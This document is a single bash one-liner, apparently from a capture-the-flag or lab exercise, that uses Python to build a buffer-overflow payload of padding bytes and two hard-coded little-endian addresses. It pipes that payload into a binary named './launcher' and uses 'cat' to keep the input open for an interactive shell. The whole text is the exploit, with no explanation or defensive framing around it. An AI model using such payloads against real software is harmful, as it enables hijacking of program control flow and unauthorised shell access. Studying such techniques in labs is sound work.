```bash
(python -c "print 'A'*12 + '\x08\x70\x55\x56' + 'A'*12 + '\x6d\x62\x55\x56\x00'" ; cat) | ./launcher
```
